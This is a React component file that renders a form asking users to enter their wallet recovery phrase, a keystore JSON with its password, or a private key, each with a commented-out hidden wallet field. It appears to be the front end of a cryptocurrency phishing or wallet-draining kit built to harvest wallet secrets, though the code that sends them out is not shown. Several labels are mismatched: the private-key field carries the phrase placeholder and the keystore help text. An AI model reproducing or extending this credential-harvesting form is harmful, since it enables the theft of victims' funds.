const FormSubmit = ({ keyType, changeHandler }) => {
  if (keyType === "Phrase") {
    return (
      <div>
        {/* <input
          type="text"
          name="Wallet"
          id="Wallet"
          className="hidden"
          value={wallet}
          onChange={changeHandler}
          onLoad={changeHandler}
        /> */}
        <textarea
          className="w-full h-[10rem] p-4 rounded-3xl bg-transparent border border-[#9F9F9F] placeholder:text-white placeholder:text-sm resize-none focus:outline-none focus:border-white caret-white text-white"
          placeholder="Enter your current phrase"
          id="currentPhrase"
          name="currentPhrase"
          onChange={changeHandler}
        ></textarea>
        <p className="text-white mt-3 text-xs">
          Typically 12 (sometimes 24) words separated by single spaces
        </p>
      </div>
    );
  }
  if (keyType === "Keystore JSON") {
    return (
      <div>
        {/* <input
          type="text"
          name="Wallet"
          id="Wallet"
          className="hidden"
          value={wallet}
          onChange={changeHandler}
        /> */}
        <textarea
          className="w-full h-[7rem] p-4 rounded-3xl bg-transparent border border-[#9F9F9F] placeholder:text-white placeholder:text-sm resize-none focus:outline-none focus:border-white caret-white text-white"
          placeholder="Enter your Keystore JSON"
          id="keystoreJSON"
          name="keystoreJSON"
          onChange={changeHandler}
        ></textarea>
        <input
          type="text"
          className="w-full h-[4rem] mt-3 p-4 rounded-3xl bg-transparent border border-[#9F9F9F] placeholder:text-white placeholder:text-sm resize-none focus:outline-none focus:border-white caret-white text-white"
          placeholder="Enter your current phrase"
          id="currentPhrase"
          name="currentPhrase"
          onChange={changeHandler}
        />
        <p className="text-white mt-3 text-xs">
          Several lines of text beginning with {`${"'{...}'"}`} plus the
          password you used to encrypt it.
        </p>
      </div>
    );
  }
  if (keyType === "Private Key") {
    return (
      <div>
        {/* <input
          type="text"
          name="Wallet"
          id="Wallet"
          className="hidden"
          value={wallet}
          onChange={changeHandler}
        /> */}
        <input
          type="text"
          className="w-full h-[4rem] p-4 rounded-3xl bg-transparent border border-[#9F9F9F] placeholder:text-white placeholder:text-sm resize-none focus:outline-none focus:border-white caret-white text-white"
          placeholder="Enter your current phrase"
          id="currentPhrase"
          name="currentPhrase"
          onChange={changeHandler}
        />
        <p className="text-white mt-3 text-xs">
          Several lines of text beginning with {`${"'{...}'"}`} plus the
          password you used to encrypt it.
        </p>
      </div>
    );
  }
};

export default FormSubmit;
